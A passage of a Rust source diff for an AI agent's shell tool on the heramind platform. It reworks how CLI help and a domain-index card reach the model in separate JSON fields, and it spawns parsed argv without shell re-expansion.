@@ -57,57 +57,118 @@ struct CommandOutput {
     stdout: String,
     stderr: String,
     timed_out: bool,
+    /// Cross-domain CLI index card emitted once per session as a separate JSON
+    /// field (never concatenated onto `stdout`).
+    domain_index: Option<String>,
+    /// In-process clap `--help` reference emitted ONLY on clap parse failure /
+    /// unknown subcommand as a separate JSON field (never concatenated onto
+    /// `stdout` or `stderr`).
+    usage_hint: Option<String>,
 }
 
-/// Shell tool — executes system commands.
-/// [context-injection] Domains whose `--help` reference has been injected
-/// once already this process (first-use injection, channel C). See
-/// `ShellTool::domain_help` for the rationale.
-static INJECTED_DOMAINS: std::sync::OnceLock<std::sync::Mutex<std::collections::HashSet<String>>> =
-    std::sync::OnceLock::new();
+impl CommandOutput {
+    fn plain(exit_code: Option<i32>, stdout: String, stderr: String, timed_out: bool) -> Self {
+        Self {
+            exit_code,
+            stdout,
+            stderr,
+            timed_out,
+            domain_index: None,
+            usage_hint: None,
+        }
+    }
+}
 
-/// [context-injection] Set once the cross-domain index card has been
-/// injected into a shell tool result (channel D — first shell call of the
-/// process). See `DOMAIN_INDEX` for why the index is injected rather than
-/// living in the static tool description.
-static INDEX_INJECTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
-
-/// Cross-domain subcommand index (channel D). Delivered ONCE, appended to
-/// the FIRST shell tool result, so the model sees the full CLI surface
-/// right after it has already chosen `shell` — recall without any static
-/// description-length cost.
+/// Cross-domain subcommand index (channel D). Delivered ONCE per session in
+/// the separate `domain_index` field of the first in-process `heramind` shell
+/// tool result (never appended to `stdout`, so `stdout` stays 100% valid JSON).
 ///
 /// History: first shipped inside the static description (2026-08-17); the
 /// 2026-08-18 full eval showed the 2600-char description re-triggered the
 /// ≤3B tool-selection suppression (wrong-tool grabs like file_write), so it
 /// moved here. The 27 "detoured via a wrong-but-succeeding command" failures
 /// it fixes need the map BEFORE detouring, which channel D satisfies for
-/// every case that touches shell at least once.
+/// every session that touches shell at least once.
 const DOMAIN_INDEX: &str = r#"
 
 [heramind CLI domain index — the exact subcommands that exist (one line per domain; `heramind <domain> --help` for flags)]
-- device: list get create update delete history control <ID> <CMD> types write-metric webhook-url drafts
-- agent: list get create update delete invoke memory clear-memory executions <ID> latest-execution conversation <ID> send-message <ID> (talking to an agent, NOT `message`)
-- rule: list get create update delete enable disable test history
-- dashboard: list get create update delete add-components update-component remove-components share (ADD widgets → add-components (append); TWEAK one widget → update-component; `update --components` replaces ALL and needs --replace-all — almost never what you want; `dashboard get <ID>` first to see layout/ids)
-- connector: list get create update delete enable disable test subscribe (external I/O bridges: MQTT broker / webhook / HTTP — NOT devices)
-- extension: list get install uninstall status logs config reload create build market-list market-install validate
+- device: list get create update delete history latest control <ID> <CMD> types write-metric webhook-url drafts (write-metric writes/simulates a data point — the way to feed a virtual-device test report; no broker or connection involved)
+- agent: list get create update delete control <ID> <active|paused> invoke memory clear-memory executions <ID> latest-execution conversation <ID> send-message <ID> (talking to an agent, NOT `message`; "is X OK right now" → `agent list` then `latest-execution <ID>`, not device/system)
+- rule: list get create update delete enable disable test history explain
+- dashboard: list get inspect create update delete add-components update-component remove-components share (ADD widgets → add-components (append); TWEAK one widget → update-component; `update --components` replaces ALL and needs --replace-all — almost never what you want; `dashboard get <ID>` first to see layout/ids)
+- connector: list get create update delete enable disable test subscribe subscriptions unsubscribe (external MQTT data ingestion / subscriptions; outbound webhook or MQTT data targets use push)
+- extension: list get install uninstall status logs config reload create build market-list market-install validate commands invoke
 - transform: list get create update delete enable disable metrics test-code data-sources executions (executions = recent run records; check it when a transform outputs nothing or fails)
 - widget: list get create install uninstall bundle market-list market-install
-- message: list get send read channel-list channel-get channel-types channel-type-schema channel-create channel-update channel-delete channel-test (platform alerts — NOT for talking to agents)
-- push: list get create update delete enable disable test logs stats
+- message: list get send read delete channel-list channel-get channel-types channel-type-schema channel-create channel-update channel-delete channel-test (`message send` creates a platform message — NOT for talking to agents; to act on any device use `device get <id>` then `device control <id> <command>`)
+- push: list get create update delete enable disable start stop test logs stats
 - llm: list get models create update delete activate test
 - settings: timezone set-timezone timezones retention set-retention cleanup
-- system: info — api-key: create list delete
-Anything not listed above does not exist as a subcommand — do not invent near-misses; use the exact name or `heramind <domain> --help`."#;
+- operation: list get (inspect persisted write-operation ledger status by operation_id; check whether an unknown/timed-out operation succeeded or failed)
+- system: info health stats
+- health: (server readiness and system stats summary)
+- api-key: create list delete
+Deliberately not available here (do not try them): serve prompt chat logs list-models
+check-update upgrade uninstall login logout whoami user config data — the first group only runs as a
+separate process, the rest are operator commands with their own session or irreversible effects.
+
+This is a common cheat sheet of domain verbs; full flags and aliases come from `heramind <domain> --help` (or `heramind <domain> <command> --help`). Do not invent near-miss subcommands — use an exact listed name or discover via `--help`."#;
 
 pub struct ShellTool {
     config: ShellConfig,
+    /// Session-scoped flag: set to `true` once `DOMAIN_INDEX` has been emitted
+    /// for this chat session / tool instance. Replaces the former process-global
+    /// `INDEX_INJECTED` static so Session A and Session B in a long-running
+    /// server receive identical domain-index injection.
+    index_injected: std::sync::atomic::AtomicBool,
 }
 
 impl ShellTool {
+    fn command_timeout(&self, args: &Value) -> Result<Duration> {
+        // Resolve timeout: per-command override or config default, capped at 600s
+        // Accepts both number and string forms (LLM may pass "30" as string)
+        let timeout = if let Some(user_timeout) = args.get("timeout") {
+            let secs = user_timeout
+                .as_u64()
+                .or_else(|| user_timeout.as_str().and_then(|s| s.parse::<u64>().ok()))
+                .ok_or_else(|| {
+                    ToolError::InvalidArguments("timeout must be a positive number".into())
+                })?;
+            Duration::from_secs(secs.min(crate::toolkit::timeouts::shell_max().as_secs()))
+        } else {
+            Duration::from_secs(
+                self.config
+                    .timeout_secs
+                    .min(crate::toolkit::timeouts::shell_max().as_secs()),
+            )
+        };
+
+        Ok(timeout)
+    }
+
     pub fn new(config: ShellConfig) -> Self {
-        Self { config }
+        Self {
+            config,
+            index_injected: std::sync::atomic::AtomicBool::new(false),
+        }
+    }
+
+    /// Create an isolated `ShellTool` for a single chat session with fresh
+    /// per-session injection state.
+    pub(crate) fn for_chat_session(&self, _session_id: &str) -> Self {
+        Self::new(self.config.clone())
+    }
+
+    /// Emit the cross-domain index card once per session.
+    fn take_domain_index_once(&self) -> Option<String> {
+        if !self
+            .index_injected
+            .swap(true, std::sync::atomic::Ordering::Relaxed)
+        {
+            Some(DOMAIN_INDEX.trim().to_string())
+        } else {
+            None
+        }
     }
 
     /// Build a platform-appropriate shell command.
@@ -132,33 +193,81 @@ impl ShellTool {
         // which strips most useful information from the output.
         cmd.env("HERAMIND_JSON", "1");
 
-        // Prepend the current binary's directory to PATH so subprocess `heramind`
-        // invocations resolve to the same binary that's running the server.
-        // Without this, `/bin/sh -c "heramind ..."` walks PATH and may find a
-        // stale install (e.g. `~/.cargo/bin/heramind`), causing silent version
-        // drift between server and CLI — particularly for local-only commands
-        // (extension create/build/install) that bypass in-process dispatch.
+        // Prepend a directory containing a `heramind` that resolves to the
+        // binary currently running the server, so subprocess `heramind ...`
+        // invocations can't hit a stale install (`~/.cargo/bin/heramind` was
+        // 0.9.24 while the platform ran 1.1.2 — silent version AND data-dir
+        // drift, particularly for local-only commands that bypass in-process
+        // dispatch). When this binary IS `heramind`, its own directory is
+        // that directory. The desktop bundle names it differently
+        // (`heramind-tauri`), so a plain PATH entry can never satisfy a
+        // `heramind` lookup — alias it under <data>/bin/ and prepend THAT.
         if let Ok(exe) = std::env::current_exe() {
-            if let Some(exe_dir) = exe.parent() {
-                let exe_dir = exe_dir.display().to_string();
+            let is_plain_heramind = exe
+                .file_name()
+                .map(|f| f == "heramind" || f == "heramind.exe")
+                .unwrap_or(false);
+            let dir_to_prepend = if is_plain_heramind {
+                exe.parent().map(|p| p.to_path_buf())
+            } else {
+                Self::ensure_heramind_alias(&exe)
+            };
+            if let Some(dir) = dir_to_prepend {
+                let dir = dir.display().to_string();
                 match std::env::var_os("PATH") {
                     Some(existing) => {
-                        let new_path = format!(
-                            "{}{}{}",
-                            exe_dir,
-                            path_delimiter(),
-                            existing.to_string_lossy()
-                        );
+                        let new_path =
+                            format!("{}{}{}", dir, path_delimiter(), existing.to_string_lossy());
                         cmd.env("PATH", new_path);
                     }
                     None => {
-                        cmd.env("PATH", exe_dir);
+                        cmd.env("PATH", dir);
                     }
                 }
             }
         }
 
         cmd
+    }
+
+    /// Create/refresh `<data>/bin/heramind` pointing at `exe` (the running
+    /// binary, whatever it's named) and return the directory to prepend to
+    /// PATH. Best-effort: any failure returns None (PATH stays untouched —
+    /// the pre-fix behavior, no worse).
+    ///
+    /// Unix: symlink (cheap, refresh every call so a bundle update is
+    /// picked up on the next tool call). Windows: symlinks need privileges;
+    /// copy instead, guarded by size so we only re-copy when the binary
+    /// actually changed.
+    fn ensure_heramind_alias(exe: &std::path::Path) -> Option<std::path::PathBuf> {
+        let dir = heramind_core::paths::data_dir().join("bin");
+        std::fs::create_dir_all(&dir).ok()?;
+        let alias = dir.join(if cfg!(windows) {
+            "heramind.exe"
+        } else {
+            "heramind"
+        });
+        #[cfg(unix)]
+        {
+            // remove-then-symlink: handles both stale target and first run.
+            let _ = std::fs::remove_file(&alias);
+            std::os::unix::fs::symlink(exe, &alias).ok()?;
+        }
+        #[cfg(windows)]
+        {
+            let alias_len = std::fs::metadata(&alias).map(|m| m.len()).ok();
+            let exe_len = std::fs::metadata(exe).map(|m| m.len()).ok();
+            let need_copy = match (alias_len, exe_len) {
+                (a, Some(e)) => a != Some(e),
+                // Exe unreadable (shouldn't happen — it's running) or first
+                // run: attempt the copy; fs::copy's own error decides.
+                _ => true,
+            };
+            if need_copy {
+                std::fs::copy(exe, &alias).ok()?;
+            }
+        }
+        Some(dir)
     }
 
     /// Resolve API key for heramind CLI commands.
@@ -176,97 +285,340 @@ impl ShellTool {
         })
     }
 
-    /// [context-injection] Domains whose `--help` reference has been injected
-    /// once already (first-use injection). Process-local: the eval spawns a
-    /// fresh server per case (each case gets one injection per domain); a
-    /// long-running server injects each domain on first use only — later
-    /// turns find it in the conversation history.
-    fn domain_injected(domain: &str) -> bool {
-        INJECTED_DOMAINS
-            .get_or_init(|| std::sync::Mutex::new(std::collections::HashSet::new()))
-            .lock()
-            .map(|s| s.contains(domain))
-            .unwrap_or(false)
-    }
+    /// Render compact in-process `--help` directly from clap's
+    /// `Args::command()` tree (zero subprocess spawn, no `current_exe()`
+    /// hazard in desktop/Tauri binaries).
+    ///
+    /// Attached ONLY to the separate `usage_hint` JSON field on clap parse
+    /// failure / unknown subcommand — never appended to `stdout` and never
+    /// emitted on successful commands.
+    fn in_process_domain_help(
+        domain: &str,
+        subcommand: Option<&str>,
+        note: &str,
+    ) -> Option<String> {
+        use clap::CommandFactory;
 
-    fn mark_domain_injected(domain: &str) {
-        if let Some(m) = INJECTED_DOMAINS.get() {
-            if let Ok(mut s) = m.lock() {
-                s.insert(domain.to_string());
-            }
-        }
-    }
-
-    /// [context-injection] Fetch a domain's `--help` (compact subcommand
-    /// reference) so the model sees exact syntax. Two channels:
-    /// (B) on a FAILED `heramind <domain> ...` call → "retry with the exact one"
-    /// (C) on the FIRST successful call in a domain → reference for the
-    ///     upcoming steps of a multi-step flow (create→test→enable...).
-    /// Both keep the static tool description short so ≤3B models still
-    /// SELECT `shell`; channel C is deterministic (fires only after the
-    /// model already chose shell), so there is no intent-detection
-    /// overtrigger risk.
-    async fn domain_help(domain: &str, subcommand: Option<&str>, note: &str) -> Option<String> {
         if domain.is_empty() {
             return None;
         }
-        let exe = std::env::current_exe().ok()?;
-        // Prefer the SUBCOMMAND's help — it lists the actual flags/args the
+        let mut root = heramind_cli_ops::dispatch::commands::Args::command();
+        root.build();
+
+        let domain_cmd = root
+            .get_subcommands_mut()
+            .find(|c| c.get_name() == domain || c.get_all_aliases().any(|a| a == domain))?;
+
+        // Prefer the SUBCOMMAND's help — it lists the exact flags/args the
         // model guessed wrong (`device list --all`, `rule create --id=...`,
-        // `device types create ...`). A bare domain help only lists
-        // subcommands, which is why failed calls kept retrying bad flags.
-        let deeper = match subcommand {
-            Some(sub) if !sub.starts_with('-') => {
-                let out = tokio::process::Command::new(&exe)
-                    .arg(domain)
-                    .arg(sub)
-                    .arg("--help")
-                    .output()
-                    .await
-                    .ok()?;
-                let body: String = String::from_utf8_lossy(&out.stdout)
-                    .lines()
-                    .take(28)
-                    .collect::<Vec<_>>()
-                    .join("\n");
-                (body, format!("`heramind {} {}`", domain, sub))
+        // `dashboard update-component --bad-flag`).
+        if let Some(sub) = subcommand.filter(|s| !s.starts_with('-')) {
+            if let Some(sub_cmd) = domain_cmd
+                .get_subcommands_mut()
+                .find(|c| c.get_name() == sub || c.get_all_aliases().any(|a| a == sub))
+            {
+                let body = Self::prefer_usage_sections(&sub_cmd.render_help().to_string(), 28);
+                if !body.trim().is_empty() {
+                    let mut hint = format!(
+                        "[Reference — `heramind {} {}` — {}]:\n{}",
+                        domain, sub, note, body
+                    );
+                    if let Some(tip) = Self::structured_params_retry_tip(domain, Some(sub)) {
+                        hint.push('\n');
+                        hint.push_str(&tip);
+                    }
+                    if let Some(contract) =
+                        heramind_cli_ops::json_arg::find_domain_command_contract(domain, sub)
+                    {
+                        hint.push('\n');
+                        hint.push_str(&format!(
+                            "[Contract — heramind {} {}]: {}",
+                            domain, sub, contract.guidance
+                        ));
+                    }
+                    return Some(hint);
+                }
             }
-            _ => (String::new(), format!("`heramind {}`", domain)),
-        };
-        if !deeper.0.trim().is_empty() {
-            return Some(format!(
-                "\n\n[Reference — {} — {}]:\n{}",
-                deeper.1, note, deeper.0
-            ));
         }
-        // Fallback: bare domain help.
-        let out = tokio::process::Command::new(&exe)
-            .arg(domain)
-            .arg("--help")
-            .output()
-            .await
-            .ok()?;
-        if !out.status.success() {
+
+        // Fallback: bare domain help (lists available subcommands).
+        let body = Self::prefer_usage_sections(&domain_cmd.render_help().to_string(), 28);
+        if body.trim().is_empty() {
             return None;
         }
-        let body: String = String::from_utf8_lossy(&out.stdout)
-            .lines()
-            .take(28)
-            .collect::<Vec<_>>()
-            .join("\n");
-        Some(format!(
-            "\n\n[Reference — `heramind {}` subcommands — {}]:\n{}",
+        let mut hint = format!(
+            "[Reference — `heramind {}` subcommands — {}]:\n{}",
             domain, note, body
+        );
+        if let Some(tip) = Self::structured_params_retry_tip(domain, None) {
+            hint.push('\n');
+            hint.push_str(&tip);
+        }
+        Some(hint)
+    }
+
+    /// Prefer Usage/Arguments/Options sections when truncating clap help so
+    /// required flags are not pushed out by long prose doc comments.
+    fn prefer_usage_sections(help: &str, max_lines: usize) -> String {
+        let lines: Vec<&str> = help.lines().collect();
+        if lines.len() <= max_lines {
+            return lines.join("\n");
+        }
+        let mut selected: Vec<&str> = Vec::new();
+        let mut in_priority = false;
+        for line in &lines {
+            let trimmed = line.trim();
+            if trimmed == "Usage:" || trimmed == "Arguments:" || trimmed == "Options:" {
+                in_priority = true;
+                selected.push(line);
+                continue;
+            }
+            if in_priority {
+                if !trimmed.is_empty()
+                    && !line.starts_with(' ')
+                    && !line.starts_with('\t')
+                    && trimmed.ends_with(':')
+                    && trimmed != "Usage:"
+                    && trimmed != "Arguments:"
+                    && trimmed != "Options:"
+                {
+                    in_priority = false;
+                    continue;
+                }
+                selected.push(line);
+            }
+        }
+        if selected.is_empty() {
+            return lines
+                .into_iter()
+                .take(max_lines)
+                .collect::<Vec<_>>()
+                .join("\n");
+        }
+        let mut out: Vec<&str> = Vec::new();
+        for line in lines.iter().take(4) {
+            if !out.contains(line) {
+                out.push(line);
+            }
+        }
+        for line in selected {
+            if !out.contains(&line) {
+                out.push(line);
+            }
+            if out.len() >= max_lines {
+                break;
+            }
+        }
+        out.into_iter()
+            .take(max_lines)
+            .collect::<Vec<_>>()
+            .join("\n")
+    }
+
+    /// Build `domain sub <ID> --flag <NAME>` from clap required positionals
+    /// and required non-JSON flags. The primary JSON flag is omitted because
+    /// Chat should put that payload in shell `params`.
+    fn clap_required_command_template(domain: &str, sub: &str, json_flag: &str) -> String {
+        use clap::CommandFactory;
+        let mut root = heramind_cli_ops::dispatch::commands::Args::command();
+        root.build();
+        let Some(domain_cmd) = root
+            .get_subcommands_mut()
+            .find(|c| c.get_name() == domain || c.get_all_aliases().any(|a| a == domain))
+        else {
+            return format!("{domain} {sub}");
+        };
+        let Some(sub_cmd) = domain_cmd
+            .get_subcommands_mut()
+            .find(|c| c.get_name() == sub || c.get_all_aliases().any(|a| a == sub))
+        else {
+            return format!("{domain} {sub}");
+        };
+
+        let json_long = json_flag.trim_start_matches('-');
+        let mut parts = vec![domain.to_string(), sub.to_string()];
+        for arg in sub_cmd.get_arguments() {
+            if arg.get_long().is_some_and(|l| l == json_long) || arg.get_id().as_str() == json_long
+            {
+                continue;
+            }
+            let required = arg.is_required_set() || arg.is_positional();
+            if !required {
+                continue;
+            }
+            if arg.is_positional() {
+                let name = arg
+                    .get_value_names()
+                    .and_then(|v| v.first())
+                    .map(|s| s.as_str())
+                    .unwrap_or(arg.get_id().as_str())
+                    .to_ascii_uppercase();
+                parts.push(format!("<{name}>"));
+            } else if let Some(long) = arg.get_long() {
+                let name = arg
+                    .get_value_names()
+                    .and_then(|v| v.first())
+                    .map(|s| s.as_str())
+                    .unwrap_or(long)
+                    .to_ascii_uppercase()
+                    .replace('-', "_");
+                parts.push(format!("--{long} <{name}>"));
+            }
+        }
+        parts.join(" ")
+    }
+
+    /// One-line Chat/shell-tool tip prepended onto clap `usage_hint` when the
+    /// failing command has a primary JSON flag — steers Spark/small models
+    /// toward structured `params` instead of quote-fragile CLI strings.
+    pub(crate) fn structured_params_retry_tip(
+        domain: &str,
+        subcommand: Option<&str>,
+    ) -> Option<String> {
+        let sub = subcommand?;
+        let argv = vec!["heramind".to_string(), domain.to_string(), sub.to_string()];
+        let spec = heramind_cli_ops::json_arg::primary_json_spec(&argv)?;
+        let kind = match spec.kind {
+            heramind_cli_ops::json_arg::ExpectedJsonKind::Object => "JSON object",
+            heramind_cli_ops::json_arg::ExpectedJsonKind::Array => "JSON array",
+        };
+        let cmd_tail = Self::clap_required_command_template(domain, sub, spec.flag);
+        Some(format!(
+            "Preferred from Chat/shell tool: put the {kind} in shell `params` (maps to {}). \
+             Keep `command` free of quoted {} strings. Example shape: \
+             {{\"command\":\"heramind {}\", \"params\": <{kind}>}}.",
+            spec.flag, spec.flag, cmd_tail
         ))
+    }
+
+    /// Resolve the `heramind` binary for argv-based subprocess spawn
+    /// (no shell). Prefers the running server binary / data-dir alias so
+    /// PATH drift cannot reintroduce a stale CLI.
+    fn resolve_heramind_executable() -> std::path::PathBuf {
+        if let Ok(exe) = std::env::current_exe() {
+            let is_plain_heramind = exe
+                .file_name()
+                .map(|f| f == "heramind" || f == "heramind.exe")
+                .unwrap_or(false);
+            if is_plain_heramind {
+                return exe;
+            }
+            if let Some(dir) = Self::ensure_heramind_alias(&exe) {
+                return dir.join(if cfg!(windows) {
+                    "heramind.exe"
+                } else {
+                    "heramind"
+                });
+            }
+        }
+        std::path::PathBuf::from("heramind")
+    }
+
+    /// Spawn `argv` (already tokenized `heramind …`) without `/bin/sh -c`.
+    ///
+    /// Used when in-process dispatch returns [`DispatchError::NotInProcess`]:
+    /// falling back to the raw shell string would re-expand quoted `$()` /
+    /// backticks that tokenize intentionally kept literal — including after a
+    /// ProvenReadOnly classify (e.g. `list-models`).
+    async fn spawn_heramind_argv(&self, argv: &[String], timeout: Duration) -> CommandOutput {
+        let exe = Self::resolve_heramind_executable();
+        let mut cmd = std::process::Command::new(&exe);
+        if argv.len() > 1 {
+            cmd.args(&argv[1..]);
+        }
+        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());
+        set_process_group(&mut cmd);
+        if let Some(key) = Self::resolve_api_key() {
+            cmd.env("HERAMIND_API_KEY", key);
+        }
+        cmd.env("HERAMIND_JSON", "1");
+
+        tracing::debug!(
+            target: "heramind::agent::shell",
+            in_process = false,
+            argv = ?argv,
+            exe = %exe.display(),
+            "NotInProcess — spawning parsed argv without shell reinterpretation"
+        );
+
+        let mut child = match tokio::process::Command::from(cmd).spawn() {
+            Ok(c) => c,
+            Err(e) => {
+                return CommandOutput::plain(
+                    Some(1),
+                    String::new(),
+                    format!("Failed to spawn heramind argv: {e}"),
+                    false,
+                );
+            }
+        };
+        let stdout_handle = child.stdout.take();
+        let stderr_handle = child.stderr.take();
+        let mut guard = SubprocessGuard { child: Some(child) };
+        let result = tokio::time::timeout(timeout, async {
+            let stdout_fut = async {
+                if let Some(mut s) = stdout_handle {
+                    let mut buf = Vec::new();
+                    s.read_to_end(&mut buf).await?;
+                    Ok::<_, std::io::Error>(buf)
+                } else {
+                    Ok(Vec::new())
+                }
+            };
+            let stderr_fut = async {
+                if let Some(mut s) = stderr_handle {
+                    let mut buf = Vec::new();
+                    s.read_to_end(&mut buf).await?;
+                    Ok::<_, std::io::Error>(buf)
+                } else {
+                    Ok(Vec::new())
+                }
+            };
+            let (out_bytes, err_bytes) = tokio::try_join!(stdout_fut, stderr_fut)?;
+            let status = guard
+                .child
+                .as_mut()
+                .ok_or_else(|| std::io::Error::other("child disarmed before wait"))?
+                .wait()
+                .await?;
+            Ok::<_, std::io::Error>((out_bytes, err_bytes, status))
+        })
+        .await;
+
+        match result {
+            Ok(Ok((out, err, status))) => {
+                guard.child = None;
+                let raw_stdout = String::from_utf8_lossy(&out).into_owned();
+                let raw_stderr = String::from_utf8_lossy(&err).into_owned();
+                let (stdout, stderr) =
+                    truncate_output(&raw_stdout, &raw_stderr, self.config.max_output_chars);
+                CommandOutput::plain(status.code(), stdout, stderr, false)
+            }
+            Ok(Err(e)) => {
+                guard.child = None;
+                CommandOutput::plain(
+                    Some(1),
+                    String::new(),
+                    format!("argv spawn I/O error: {e}"),
+                    false,
+                )
+            }
+            Err(_) => CommandOutput::plain(
+                None,
+                String::new(),
+                format!("Command timed out after {}s", timeout.as_secs()),
+                true,
+            ),
+        }
     }
 
     /// Attempt in-process dispatch for `heramind` data commands.
     ///
-    /// Returns `Some(output)` if the command was handled in-process (either
-    /// success, a parse error, or an API error); returns `None` for
-    /// [`DispatchError::NotInProcess`] (side-effecting / interactive /
-    /// local-only subcommands) so the caller falls back to spawning a real
-    /// subprocess.
+    /// Returns `Some(output)` if the command was handled in-process (success,
+    /// parse/API error) **or** via argv subprocess after
+    /// [`DispatchError::NotInProcess`]. Returns `None` only when the line
+    /// cannot be tokenized as pure `heramind` argv — then the caller may use
+    /// the shell path.
     ///
     /// Non-`heramind` commands and malformed input (unbalanced quotes) also
     /// yield `None` so they hit the subprocess path unchanged.
@@ -321,6 +673,8 @@ impl ShellTool {
                     .all(|p| p.starts_with("heramind ") || *p == "heramind");
             if all_heramind {
                 let mut outputs: Vec<String> = Vec::new();
+                let mut domain_index: Option<String> = None;
+                let mut usage_hint: Option<String> = None;
                 for part in parts {
                     // Boxed: the recursive async call needs indirection (the
                     // chain length is runtime-variable → unbounded future).
@@ -328,13 +682,21 @@ impl ShellTool {
                         Some(out) => {
                             let code = out.exit_code.unwrap_or(1);
                             outputs.push(out.stdout);
+                            if domain_index.is_none() {
+                                domain_index = out.domain_index;
+                            }
+                            if out.usage_hint.is_some() {
+                                usage_hint = out.usage_hint;
+                            }
                             // `&&` stops on failure; `;` always continues.
                             if sep == "&&" && code != 0 {
                                 return Some(CommandOutput {
                                     exit_code: Some(code),
                                     stdout: outputs.join("\n--- && ---\n"),
-                                    stderr: String::new(),
+                                    stderr: out.stderr,
                                     timed_out: false,
+                                    domain_index,
+                                    usage_hint,
                                 });
                             }
                         }
@@ -346,6 +708,8 @@ impl ShellTool {
                     stdout: outputs.join(format!("\n--- {} ---\n", sep.trim()).as_str()),
                     stderr: String::new(),
                     timed_out: false,
+                    domain_index,
+                    usage_hint,
                 });
             }
             // Mixed heramind/non-heramind with && or ; → let /bin/sh handle it.
@@ -381,18 +745,37 @@ impl ShellTool {
             return None;
         }
 
-        // Make auth + JSON-output env visible to the in-process handler.
-        // `dispatch`'s `ApiClient` reads `HERAMIND_API_KEY` (via auto_auth)
-        // and the handlers read `HERAMIND_JSON` to pick the output format.
-        // This mirrors the env injection done for the subprocess in
-        // `build_command`.
-        if let Some(key) = Self::resolve_api_key() {
-            // NOTE: env mutation is process-global. The agent runtime is
-            // single-tenancy and is the only concurrent writer of this var,
-            // so this is equivalent to the existing subprocess env injection.
-            std::env::set_var("HERAMIND_API_KEY", key);
-        }
-        std::env::set_var("HERAMIND_JSON", "1");
+        // Host lifecycle tokens must never reach clap (`_new_operation=true`
+        // appended inside `command` was a live clap "unexpected argument").
+        let argv = strip_host_meta_from_argv(argv);
+
+        // Structured shell `params` → primary JSON flag as a clean argv token
+        // (no model-facing quote wrapping). Host context wins when present.
+        let argv = match inject_structured_json_argv(argv) {
+            Ok(a) => a,
+            Err(msg) => {
+                return Some(CommandOutput::plain(Some(1), String::new(), msg, false));
+            }
+        };
+
+        // NM-240: bind Chat write-gate to the same PreparedInvoke HTTP will
+        // consume. Authorize Mutating tickets on the execute path (RO was
+        // authorized at classify); inject --prepared-operation-id.
+        let argv = match bind_extension_invoke_prepared_token(argv) {
+            Ok(a) => a,
+            Err(msg) => {
+                return Some(CommandOutput::plain(Some(1), String::new(), msg, false));
+            }
+        };
+
+        // Pass auth + JSON output explicitly via DispatchContext — never mutate
+        // process-global environment variables (`std::env::set_var`) on an
+        // async multi-threaded hot path.
+        let dispatch_ctx = heramind_cli_ops::dispatch::DispatchContext {
+            api_base: std::env::var("HERAMIND_API_BASE").ok(),
+            api_key: Self::resolve_api_key(),
+            output_format: Some(heramind_cli_ops::types::OutputFormat::Json),
+        };
 
         tracing::debug!(
             target: "heramind::agent::shell",
@@ -402,107 +785,141 @@ impl ShellTool {
         );
 
         // Apply the same per-command timeout as the subprocess path. The
-        // ApiClient has its own 30s HTTP timeout, but a handler may issue
+        // ApiClient has its own HTTP timeout (70s for agent invoke), but may issue
         // multiple requests; this guarantees the in-process path cannot hang
         // longer than the subprocess equivalent would.
-        match tokio::time::timeout(timeout, heramind_cli_ops::dispatch::dispatch(&argv)).await {
+        match tokio::time::timeout(
+            timeout,
+            heramind_cli_ops::dispatch::dispatch_with_context(&argv, &dispatch_ctx),
+        )
+        .await
+        {
             Ok(Ok(resp)) => {
                 let exit_code = if resp.success { 0 } else { 1 };
-                let mut stdout = serde_json::to_string_pretty(&resp).unwrap_or_else(|e| {
+                let stdout = serde_json::to_string_pretty(&resp).unwrap_or_else(|e| {
                     format!(
                         "{{\"success\":false,\"error\":\"serialize failed: {}\"}}",
                         e
                     )
                 });
-                // [context-injection] (D) FIRST shell call of the process →
-                // cross-domain index card (see DOMAIN_INDEX for why this
-                // lives here and not in the static description). (B)
-                // failure → --help to correct on retry; (C) FIRST
-                // successful call in a domain → --help as reference for the
-                // upcoming steps of multi-step flows.
-                if !INDEX_INJECTED.swap(true, std::sync::atomic::Ordering::Relaxed) {
-                    stdout.push_str(DOMAIN_INDEX);
-                }
-                if let Some(domain) = argv.get(1) {
-                    // First non-flag token after the domain = the subcommand;
-                    // its --help lists the actual flags the model may have
-                    // guessed wrong (`--all`, `--format=json`, ...).
-                    let subcommand = argv
-                        .get(2)
-                        .map(String::as_str)
-                        .filter(|s| !s.starts_with('-'));
-                    let help: Option<String> = if !resp.success {
-                        Self::domain_help(domain.as_str(), subcommand, "retry with the exact one")
-                            .await
-                    } else if !Self::domain_injected(domain.as_str()) {
-                        let h = Self::domain_help(
-                            domain.as_str(),
-                            subcommand,
-                            "use the exact one for the next steps",
-                        )
-                        .await;
-                        if h.is_some() {
-                            Self::mark_domain_injected(domain.as_str());
-                        }
-                        h
-                    } else {
-                        None
-                    };
-                    if let Some(help) = help {
-                        stdout.push_str(&help);
-                    }
-                }
+                // Keep `stdout` 100% valid JSON: deliver the session-scoped
+                // cross-domain index card in its own `domain_index` field once
+                // per session, and never attach `--help` on successful runs or
+                // runtime business errors.
+                let domain_index = self.take_domain_index_once();
                 Some(CommandOutput {
                     exit_code: Some(exit_code),
                     stdout,
                     stderr: String::new(),
                     timed_out: false,
+                    domain_index,
+                    usage_hint: None,
                 })
             }
             Ok(Err(heramind_cli_ops::dispatch::DispatchError::NotInProcess)) => {
-                tracing::debug!(
-                    target: "heramind::agent::shell",
-                    in_process = false,
-                    command = %command,
-                    "falling back to subprocess (NotInProcess)"
+                // Already have argv from tokenize — never re-interpret the raw
+                // shell string (quoted `$()` would expand under /bin/sh -c).
+                // Classifier may have marked this ProvenReadOnly (list-models /
+                // health / whoami); argv spawn preserves that literal argv.
+                debug_assert!(
+                    not_in_process_uses_parsed_argv(),
+                    "NotInProcess must spawn parsed argv, not raw shell"
                 );
-                None
+                Some(self.spawn_heramind_argv(&argv, timeout).await)
             }
             Ok(Err(heramind_cli_ops::dispatch::DispatchError::Parse(msg))) => {
-                let mut stderr = format!("error: {}", msg);
-                // [context-injection] bad subcommand/args → append domain --help.
-                if let Some(domain) = argv.get(1) {
-                    let subcommand = argv
-                        .get(2)
-                        .map(String::as_str)
-                        .filter(|s| !s.starts_with('-'));
-                    if let Some(help) =
-                        Self::domain_help(domain.as_str(), subcommand, "retry with the exact one")
-                            .await
-                    {
-                        stderr.push_str(&help);
-                    }
+                let mut stderr = parse_error_stderr(&msg);
+                // A rejected flag needs the CLI usage, not an unrelated path
+                // quoting hint. Inspect the offending token and its adjacent
+                // argv fragment instead of quotes anywhere in the command.
+                if should_hint_split_path(&msg, &argv) {
+                    stderr.push_str(
+                        "\nHint: an argument containing SPACES (e.g. a path under \"Application Support\") must be wrapped in double quotes: heramind widget install \"/Users/.../Application Support/.../device-info-widget\".",
+                    );
                 }
+                let domain_index = self.take_domain_index_once();
+                // Clap parse failure / unknown subcommand → attach in-process
